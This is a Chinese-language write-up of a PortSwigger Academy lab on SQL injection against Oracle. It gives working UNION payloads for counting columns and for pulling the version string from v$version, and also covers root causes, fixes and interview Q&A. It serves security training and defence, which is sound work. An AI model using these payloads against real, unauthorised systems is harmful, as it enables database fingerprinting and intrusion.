# SQL 注入：查询 Oracle 数据库类型和版本

| 项 | 内容 |
|---|---|
| 来源 | PortSwigger Academy |
| 难度 | APPRENTICE |
| 模块 | SQL 注入 |
| 日期 | 2026-09-17 |
| 耗时 | 待补充 |

## 一、漏洞原理

这一题**不属于 UNION 取数据系列**，而属于 **examining the database（探测数据库自身信息）** 系列。

任务原文（页面横幅）：

> Make the database retrieve the strings: `Oracle Database 11g Express Edition Release ...`

也就是：**让数据库把自己的版本信息显示出来。**

版本信息**不在任何业务表里** —— 它是数据库的**运行时属性**，要通过各数据库专有的方式去问。这就是这题的考点：**换一种"问法"。**

### 关键认知：先读横幅，再动手

> **每道题的第一件事，是读顶部那条 "To solve the lab..." 横幅 —— 它写死了判定标准。**

本題的横幅明确要求"检索版本字符串"，从头到尾没提枚举表。**如果把它当成 004（跨表读数据）来做，去枚举 `all_tables` 找"装着版本号的表"，那是永远到不了终点的** —— 因为版本号根本不在业务表里。

**教训**：技术对了、注入点对了，目标读错一样白费。**判定标准必须先看清楚。**

### Oracle 的两个特殊之处

**特殊点 1：`SELECT` 必须有 `FROM`**

Oracle 要求每条 `SELECT` 都指定数据源。即使不查任何表，也得写 `FROM dual`（`dual` 是 Oracle 的内置单行单列表）。

```sql
' UNION SELECT NULL,NULL FROM dual--     ← dual 在这里只为满足语法
```

**特殊点 2：没有 `information_schema`**

MySQL / PostgreSQL / SQL Server 上的那套 `information_schema` **在 Oracle 上不存在**。Oracle 对应的是：

| 用途 | Oracle 写法 |
|---|---|
| 列出表 | `SELECT table_name FROM all_tables` |
| 列出列 | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` |

注意 `all_tab_columns` 里的表名通常**大写**。

**特殊点 3：`v$version` 是动态性能视图**

Oracle 的版本信息在 **`v$version`**。它是**动态性能视图（dynamic performance view）**，不在 `all_tables` 的普通业务表清单里 —— 所以**枚举表名这条路本身就找不到它**。这类视图是数据库运行状态的入口。

其余数据库的版本查询对照：

| 数据库 | 版本查询 |
|---|---|
| Oracle | `SELECT * FROM v$version`（或 `SELECT banner FROM v$version`） |
| Microsoft / MySQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |

## 二、复现步骤

1. Burp 抓 `category` 参数请求
2. 确认列数（Oracle 记得带 `FROM dual`）：

| payload | 响应 | 结论 |
|---|---|---|
| `Accessories'` | 500 | 注入点存在 |
| `' UNION SELECT NULL FROM dual--` | 500 | 不是 1 列 |
| `' UNION SELECT NULL,NULL FROM dual--` | **200** | **是 2 列** |
| `' UNION SELECT NULL,NULL,NULL FROM dual--` | 500 | 不是 3 列 |

3. 把版本查询塞进回显位：

```
category=Accessories' UNION SELECT banner,NULL FROM v$version--
```

（`banner` 换成 `*` 也可以，用 `*` 时要占满对应的列数位置）

4. 响应中出现了完整的 Oracle 版本字符串 → 横幅变为 **Solved**

**关键点**：`v$version` 返回**多行**，每一行是一段版本信息（数据库版本、PL/SQL 版本、CORE、TNS、NLSRTL）。UNION 会把这几行**纵向拼进结果集**，所以横幅要求的"一串逗号连接的长字符串"实际是这几行在页面上连续显示的结果。

## 三、根本原因

- 用户输入被拼进 SQL 执行（全部 SQL 注入题同源）
- **本題多暴露两点**：
  1. **数据库版本信息对应用账号可见** —— 版本号能直接反查已知 CVE，是渗透的"指纹"阶段。攻击者拿到 `11.2.0.2.0` 就知道该找哪个版本的漏洞
  2. **动态性能视图未做权限隔离** —— `v$version` 这类视图本可以只对 DBA 开放

## 四、修复方案

1. **参数化查询** —— 根治
2. **数据库账号最小权限** —— 撤销应用账号对 `v$*` 动态性能视图、`all_*` 数据字典视图的访问权。业务账号不该有权查数据库自身元信息
3. **关闭详细错误回显** —— 不让"列数不匹配"等报错成为探针
4. **版本管理** —— 及时升级，使"知道版本"不等于"知道可用漏洞"

## 五、面试问答

**Q：Oracle 上做 UNION 注入有什么特别要注意的？**
A：① 每条 `SELECT` 必须 `FROM dual`；② 没有 `information_schema`，用 `all_tables` / `all_tab_columns`；③ 数据字典里的表名通常大写；④ 版本查询是 `v$version`。

**Q：为什么枚举 `all_tables` 找不到版本号？**
A：`v$version` 是动态性能视图，不是用户业务表，不出现在 `all_tables` 里。版本是数据库运行时属性。

**Q：各数据库怎么查版本？**
A：Oracle `v$version`；MySQL / SQL Server `@@version`；PostgreSQL `version()`。注入时用哪个能成功，本身就是判断数据库类型的依据 —— **能跑通哪种写法，就知道对面是什么库。**

**Q：为什么"先读题目横幅"很重要？**
A：横幅定义了判定标准。目标读错时，技术再对也到不了终点 —— 本題就是例子：把"读版本"误当成"枚举表找数据"。

**Q：知道数据库版本有什么用？**
A：反查该版本的已知漏洞（CVE），决定后续攻击路径。是渗透测试的指纹识别阶段。

## 六、参考

- [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
- [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 标签

`#SQL注入` `#Oracle` `#v$version` `#FROM dual` `#数据库指纹`
